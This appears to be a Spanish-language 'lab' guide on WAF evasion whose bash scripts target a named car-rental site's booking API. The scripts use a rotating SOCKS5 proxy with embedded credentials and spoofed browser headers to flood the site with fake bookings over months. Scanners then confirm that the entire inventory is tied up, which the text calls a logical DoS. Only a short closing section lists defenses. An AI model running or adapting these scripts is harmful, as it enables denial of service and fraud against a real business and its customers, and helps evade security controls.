# 🛡️ Laboratorio 014: Detección y Evasión de WAF (Web Application Firewall)

## Objetivo Educativo
Enseñar a los estudiantes a **identificar qué capa de seguridad** está bloqueando sus peticiones y **cómo un atacante real evade** esas protecciones para que puedan diseñar defensas más robustas.

---

## 📡 FASE 1: Reconocimiento — ¿Quién me está bloqueando?

### 1.1 Inspeccionar la Respuesta Cruda (Headers + Body)
El primer paso es NO usar `jq` y ver la respuesta COMPLETA del servidor, incluyendo los headers HTTP.

```bash
# Variables base
export TARGET="https://oceandrivecarental.com/server/public"

# 🔄 PROXY ROTATIVO WEBSHARE (SOCKS5): Rota IP automáticamente en cada petición
# SOCKS5 no inyecta headers X-Forwarded-For, haciendo al atacante invisible
PROXY="socks5://wvnqvmnp:tzc6kv4l6ope@p.webshare.io:1080"

# 🔍 Ver TODA la respuesta: headers + body + código HTTP
curl -v -x "$PROXY" \
     -X POST "$TARGET/bookings" \
     -H "Content-Type: application/json" \
     -d '{"category_id":1,"start_date":"2026-05-01","end_date":"2026-05-02","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"Test User","email":"test-recon@test.com","phone":"+573001234567","nationality":"Colombia","doc_type":"CC","doc_number":"1234567890"}}' 2>&1
```

**¿Qué buscar en la respuesta?**
| Indicador | Significado |
|-----------|-------------|
| `< server: cloudflare` | Cloudflare WAF interceptando |
| `< server: LiteSpeed` | Hostinger WAF (ModSecurity) |
| `< x-powered-by: PHP` | Llegó al backend PHP real |
| `< HTTP/2 403` | WAF bloqueó antes de llegar a PHP |
| `< HTTP/2 429` | Rate Limiter (puede ser WAF o PHP) |
| `< HTTP/2 200/201` | Llegó al backend y respondió |
| Texto: "Policía Nacional" | Honeypot/trampa disuasoria del WAF |

### 1.2 Comparar Petición Legítima vs Petición de Script
```bash
# 🟢 PETICIÓN LEGÍTIMA: Simular exactamente lo que hace el navegador Angular
curl -v -x "$PROXY" \
     -X POST "$TARGET/bookings" \
     -H "Content-Type: application/json" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" \
     -H "Accept: application/json, text/plain, */*" \
     -H "Accept-Language: es-CO,es;q=0.9,en;q=0.8" \
     -H "Origin: https://oceandrivecarental.com" \
     -H "Referer: https://oceandrivecarental.com/reservar" \
     -d '{"category_id":1,"start_date":"2026-05-01","end_date":"2026-05-02","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"María García","email":"maria.garcia.recon@gmail.com","phone":"+573001234567","nationality":"Colombia","doc_type":"CC","doc_number":"1098765432"}}' 2>&1 | head -50
```

**Pregunta para el estudiante:** ¿Cuál de las dos peticiones pasa? ¿Por qué? La diferencia son los **headers de navegador**. Un WAF moderno compara el `User-Agent` y los headers `Origin`/`Referer` contra patrones conocidos de bots.

---

## 🔬 FASE 2: Análisis — Entendiendo la Capa de Defensa

### 2.1 Fingerprinting del WAF
```bash
# Detectar el tipo de WAF con una petición GET simple
curl -s -D - -x "$PROXY" \
     -X GET "$TARGET/vehicles" -o /dev/null | grep -iE "server|x-powered|cf-ray|x-sucuri|x-hostinger|set-cookie"
```

### 2.2 Test de Umbrales (¿Cuántas peticiones me permite?)
```bash
# Disparar 25 peticiones rápidas y contar cuántas pasan vs cuántas bloquea
for i in $(seq 1 25); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -x "$PROXY" \
        -X GET "$TARGET/vehicles")
    echo "Petición #$i → HTTP $STATUS"
    sleep 0.3
done
```

**Resultado esperado:** Las primeras N peticiones devuelven `200`, y después de cierto umbral empiezan a devolver `403` o `429`. Ese número es el **Rate Limit del WAF**.

---

## ⚔️ FASE 3: Evasión — Bypass del WAF para Continuar el Ataque

### 3.1 Técnica "Browser Impersonation" (Suplantación de Navegador)
El WAF filtra peticiones que NO parecen venir de un navegador real. La solución: hacer que `curl` sea **indistinguible** de un usuario en Chrome.

```bash
echo "🚀 Operación Asimétrica con Evasión de WAF..."

# 🔄 PROXY ROTATIVO WEBSHARE (SOCKS5)
# Cada petición sale con una IP diferente automáticamente.
# SOCKS5 no inyecta X-Forwarded-For → el WAF no detecta que es proxy.
PROXY="socks5://wvnqvmnp:tzc6kv4l6ope@p.webshare.io:1080"

# 🛡️ Headers que imitan un navegador Chrome real en Windows
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

for cat in 1 2 3 4; do
    case $cat in 
        1) START_BASE="2026-04-21"; DAYS=71; STOCK=1 ;;
        2) START_BASE="2026-04-19"; DAYS=73; STOCK=2 ;;
        3) START_BASE="2026-04-20"; DAYS=72; STOCK=3 ;;
        4) START_BASE="2026-04-18"; DAYS=74; STOCK=1 ;;
    esac

    DIAS=$(php -r "for(\$i=0; \$i<\$argv[2]; \$i++){ echo date('Y-m-d', strtotime(\"\$argv[1] +\$i days\")) . '|' . date('Y-m-d', strtotime(\"\$argv[1] +\".(\$i+1).\" days\")) . '|' . date('md', strtotime(\"\$argv[1] +\$i days\")) . \"\n\"; }" "$START_BASE" "$DAYS")

    for linea in $DIAS; do
        START=$(echo $linea | cut -d'|' -f1 | tr -d '\r')
        END=$(echo $linea | cut -d'|' -f2 | tr -d '\r')
        DIA_ID=$(echo $linea | cut -d'|' -f3 | tr -d '\r')

        for ((u=1; u<=STOCK; u++)); do
            DOC="D$(date +%s)${cat}${u}${DIA_ID}"
            EMAIL="bot-${DIA_ID}-${cat}-${u}@dark-net.com"

            echo -n "[*] Cat:$cat Día:$START (U $u) via SOCKS5 rotativo... "

            # 🛡️ Escribir JSON limpio (sin CRLF) usando printf
            printf '{"category_id":%d,"start_date":"%s","end_date":"%s","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"Phantom Bot %s","email":"%s","phone":"+57300%s%d","nationality":"Colombia","doc_type":"CC","doc_number":"%s"}}' "$cat" "$START" "$END" "$DIA_ID" "$EMAIL" "$DIA_ID" "$u" "$DOC" > payload_tmp.json

            # 🔑 SOCKS5 rotativo + Headers de navegador = Evasión total
            curl -s -x "$PROXY" \
                -X POST "$TARGET/bookings" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $UA" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: es-CO,es;q=0.9,en;q=0.8" \
                -H "Origin: https://oceandrivecarental.com" \
                -H "Referer: https://oceandrivecarental.com/reservar" \
                -d @payload_tmp.json | jq -r '.message // .error'
                
            # ⏱️ Delay aleatorio entre 1-3 segundos (simula comportamiento humano)
            sleep $(( (RANDOM % 3) + 1 ))
        done
    done
done
rm -f payload_tmp.json
echo "💀 Bombardeo con Evasión WAF Completado."
```

### 3.2 ¿Qué Cambió vs el Script Anterior?

| Aspecto | Script Anterior (Bloqueado) | Script con Evasión (Bypass) |
|---------|---------------------------|----------------------------|
| **Protocolo Proxy** | HTTP (filtra `X-Forwarded-For`) | **SOCKS5** (invisible) |
| **Rotación de IP** | Manual (3 IPs fijas) | **Automática** (pool de Webshare) |
| **User-Agent** | `curl/8.x` (delata bot) | Chrome 125 en Windows |
| **Origin** | Ninguno | `https://oceandrivecarental.com` |
| **Referer** | Ninguno | `.../reservar` (página legítima) |
| **Accept** | Ninguno | `application/json` (como Angular) |
| **Timing** | `sleep 0.5` (muy rápido) | `sleep 1-3` (aleatorio, humano) |

### 3.3 ¿Por qué SOCKS5 y no HTTP?

| Protocolo | `X-Forwarded-For` | Detección WAF | Velocidad |
|-----------|-------------------|---------------|----------|
| **HTTP Proxy** | ✅ Lo inyecta (revela IP real) | Fácil de detectar | Rápido |
| **SOCKS5** | ❌ No inyecta nada | Casi imposible | Igual | 

> **Lección:** El proxy HTTP añade headers como `X-Forwarded-For`, `Via`, y `X-Real-IP` que le dicen al WAF exactamente quién eres. SOCKS5 trabaja a nivel TCP puro: el servidor **solo ve la IP del proxy**, nunca la tuya.

### 3.4 Verificación Post-Ataque: Scanner de Disponibilidad con Emojis
Después de ejecutar el bombardeo, los alumnos deben verificar que las reservas fueron exitosas. Este scanner consulta la disponibilidad día por día y muestra ✅ (disponible) o ❌ (bloqueado) para cada categoría.

**Scanner Abril (desde hoy hasta fin de mes):**
```bash
echo "=== 🔍 SCANNER POST-ATAQUE: ABRIL 2026 ==="
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+ "
echo "-----------|------|------|------|------|------"

PROXY="socks5://wvnqvmnp:tzc6kv4l6ope@p.webshare.io:1080"

DIAS=$(php -r 'for($i=18; $i<=30; $i++){ echo "2026-04-$i\n"; }')

for fecha in $DIAS; do
    fecha=$(echo $fecha | tr -d '\r')
    manana=$(php -r "echo date('Y-m-d', strtotime('$fecha +1 day'));")
    manana=$(echo $manana | tr -d '\r')
    
    RESPONSE=$(curl -s -x "$PROXY" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -X GET "$TARGET/bookings/availability?start_date=$fecha&end_date=$manana&pickup_time=12:30&dropoff_time=10:00")
    
    STATUS=$(echo "$RESPONSE" | jq -r '
        def check(id): (map(select(.id == id)) | .[0].is_available);
        "\(if check(1) then " ✅ " else " ❌ " end)|\(if check(2) then " ✅ " else " ❌ " end)|\(if check(3) then " ✅ " else " ❌ " end)|\(if check(4) then " ✅ " else " ❌ " end)|\(if check(5) then " ⚠️ " else " ❌ " end)"
    ')
    
    echo "$fecha |$STATUS"
    sleep 0.5
done
```

**Scanner Mayo-Junio (60 días):**
```bash
echo "=== 🔍 SCANNER POST-ATAQUE: MAYO-JUNIO 2026 ==="
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+ "
echo "-----------|------|------|------|------|------"

PROXY="socks5://wvnqvmnp:tzc6kv4l6ope@p.webshare.io:1080"

DIAS=$(php -r 'for($i=0; $i<60; $i++){ echo date("Y-m-d", strtotime("2026-05-01 +$i days")) . "\n"; }')

for fecha in $DIAS; do
    fecha=$(echo $fecha | tr -d '\r')
    manana=$(php -r "echo date('Y-m-d', strtotime('$fecha +1 day'));")
    manana=$(echo $manana | tr -d '\r')
    
    RESPONSE=$(curl -s -x "$PROXY" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -X GET "$TARGET/bookings/availability?start_date=$fecha&end_date=$manana&pickup_time=12:30&dropoff_time=10:00")
    
    STATUS=$(echo "$RESPONSE" | jq -r '
        def check(id): (map(select(.id == id)) | .[0].is_available);
        "\(if check(1) then " ✅ " else " ❌ " end)|\(if check(2) then " ✅ " else " ❌ " end)|\(if check(3) then " ✅ " else " ❌ " end)|\(if check(4) then " ✅ " else " ❌ " end)|\(if check(5) then " ⚠️ " else " ❌ " end)"
    ')
    
    echo "$fecha |$STATUS"
    sleep 0.5
done
```

**Resultado esperado post-ataque exitoso:**
```
FECHA      | ECON | COMP | COMP+| SUV  | SUV+ 
-----------|------|------|------|------|------
2026-04-21 | ❌ | ❌ | ❌ | ❌ | ❌
2026-04-22 | ❌ | ❌ | ❌ | ❌ | ❌
2026-04-23 | ❌ | ❌ | ❌ | ❌ | ❌
...todo ❌ hasta junio...
```

> **Interpretación:** Si todo aparece ❌, el ataque DoS lógico fue exitoso y el 100% del inventario está inmovilizado con reservas fantasma. Si aún hay ✅, significa que el WAF bloqueó algunas peticiones y hay que re-ejecutar el ataque para esos slots restantes.

---

## 🧠 FASE 4: Lecciones Defensivas

### ¿Qué aprendimos como DEFENSORES?

1. **Rate Limiting por IP no es suficiente:** El atacante usa proxies rotatorios.
2. **Verificar User-Agent no es suficiente:** El atacante lo puede falsificar.
3. **El mensaje "Policía Nacional" es un Honeypot Disuasorio:** Asusta al atacante novato, pero un atacante experimentado sabe que es falso y lo ignora.

### ¿Qué defensas SÍ funcionarían?

| Defensa | Efectividad | Implementación |
|---------|-------------|----------------|
| **CAPTCHA v3 invisible** | ⭐⭐⭐⭐⭐ | Google reCAPTCHA en el frontend |
| **Rate Limit por huella digital** | ⭐⭐⭐⭐ | Fingerprint.js + backend validation |
| **Validación de pago previo** | ⭐⭐⭐⭐⭐ | Requirir tarjeta antes de reservar |
| **Verificación por email/SMS** | ⭐⭐⭐⭐ | OTP antes de confirmar reserva |
| **Análisis de patrones en BD** | ⭐⭐⭐ | Detectar emails `@dark-net.com` |
| **Límite por sesión autenticada** | ⭐⭐⭐⭐ | Máximo 3 reservas activas por usuario |

---

## 📋 Ejercicio para Estudiantes

1. Ejecutar el script de la Fase 1.1 (sin headers de navegador) → Documentar el bloqueo
2. Ejecutar el script de la Fase 1.2 (con headers de navegador) → ¿Pasó?
3. Ejecutar la Fase 2.2 → ¿Cuál es el umbral de Rate Limit?
4. Ejecutar la Fase 3.1 → ¿Se logró la evasión completa?
5. **Pregunta abierta:** ¿Qué defensa implementarías TÚ que NO pueda ser evadida con `curl`?

> **Respuesta correcta:** Cualquier defensa que requiera **ejecución de JavaScript en el navegador** (CAPTCHA, fingerprinting) o **verificación humana** (email OTP, pago con tarjeta) es imposible de evadir con `curl` solo.
